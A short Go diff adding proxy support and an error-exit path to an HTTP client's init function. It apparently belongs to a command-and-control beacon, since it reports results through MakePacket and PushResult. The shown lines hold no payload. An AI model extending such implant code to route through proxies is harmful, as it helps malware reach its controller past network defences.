@@ -9,6 +9,7 @@ import (
 	"main/util"
 	"math/rand"
 	"net/http"
+	"os"
 	"strconv"
 	"time"
 
@@ -22,6 +23,14 @@ var (
 // init was called at beginning of the package
 func init() {
 	httpRequest.SetTimeout(config.TimeOut * time.Second)
+	if config.ProxyUrl != "" {
+		err := httpRequest.SetProxyUrl(config.ProxyUrl)
+		if err != nil {
+			result := MakePacket(31, []byte(fmt.Sprintf("error proxy url: %s", config.ProxyUrl)))
+			PushResult(result)
+			os.Exit(1)
+		}
+	}
 	trans, _ := httpRequest.Client().Transport.(*http.Transport)
 	trans.MaxIdleConns = 20
 	trans.TLSHandshakeTimeout = config.TimeOut * time.Second
